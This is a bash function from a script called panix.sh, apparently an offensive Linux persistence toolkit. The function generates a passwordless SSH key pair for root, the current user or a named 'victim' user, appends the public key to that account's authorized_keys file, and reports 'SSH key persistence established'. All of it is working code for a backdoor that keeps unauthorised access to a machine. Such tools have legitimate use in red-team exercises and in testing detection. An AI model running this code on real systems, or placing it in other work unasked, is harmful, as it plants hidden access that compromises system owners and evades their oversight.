setup_ssh_key() {
	local default=0
	local custom=0
	local target_user=""
	local ssh_dir=""
	local ssh_key_path=""

	usage_ssh_key() {
		if check_root; then
			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
			echo "Root User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
			echo "--custom                     Use custom SSH key settings"
			echo "  --user <user>               Specify user for custom SSH key"
		else
			echo "Usage: ./panix.sh --ssh-key [OPTIONS]"
			echo "Low Privileged User Options:"
			echo "--examples                   Display command examples"
			echo "--default                    Use default SSH key settings"
		fi
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--default )
				default=1
				;;
			--custom )
				custom=1
				;;
			--user )
				shift
				target_user=$1
				;;
			--examples )
				echo "Examples:"
				echo "--default:"
				echo "./panix.sh --ssh-key --default"
				echo ""
				echo "--custom:"
				echo "sudo ./panix.sh --ssh-key --custom --user victim"
				exit 0
				;;
			--help|-h)
				usage_ssh_key
				exit 0
				;;
			* )
				echo "Invalid option for --ssh-key: $1"
				echo "Try './panix.sh --ssh-key --help' for more information."
				exit 1
		esac
		shift
	done

	if ! command -v ssh-keygen &> /dev/null; then
		echo "Error: 'ssh-keygen' is not installed. Please install it to use this feature."
		exit 1
	fi

	if [[ $default -eq 1 && $custom -eq 1 ]]; then
		echo "Error: --default and --custom cannot be specified together."
		echo "Try './panix.sh --ssh-key --help' for more information."
		exit 1
	elif [[ $default -eq 1 ]]; then
		if check_root; then
			ssh_dir="/root/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		else
			local current_user=$(whoami)
			ssh_dir="/home/$current_user/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"
		fi

		mkdir -p $ssh_dir
		ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
		cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
		echo "SSH key generated:"
		echo "Private key: $ssh_key_path"
		echo "Public key: ${ssh_key_path}.pub"

	elif [[ $custom -eq 1 ]]; then
		if [[ -z $target_user ]]; then
			echo "Error: --user must be specified when using --custom."
			echo "Try './panix.sh --ssh-key --help' for more information."
			exit 1
		fi

		if id -u $target_user &>/dev/null; then
			local user_home=$(eval echo ~$target_user)
			ssh_dir="$user_home/.ssh"
			ssh_key_path="$ssh_dir/id_rsa1822"

			mkdir -p $ssh_dir
			chown $target_user:$target_user $ssh_dir
			sudo -u $target_user ssh-keygen -t rsa -b 2048 -f $ssh_key_path -N "" -q
			cat $ssh_key_path.pub >> $ssh_dir/authorized_keys
			chown $target_user:$target_user $ssh_key_path $ssh_key_path.pub $ssh_dir/authorized_keys
			echo "SSH key generated for $target_user:"
			echo "Private key: $ssh_key_path"
			echo "Public key: ${ssh_key_path}.pub"
		else
			echo "Error: User $target_user does not exist."
			exit 1
		fi
	else
		echo "Error: Either --default or --custom must be specified for --ssh-key."
		echo "Try './panix.sh --ssh-key --help' for more information."
		exit 1
	fi

	echo "[+] SSH key persistence established!"
}
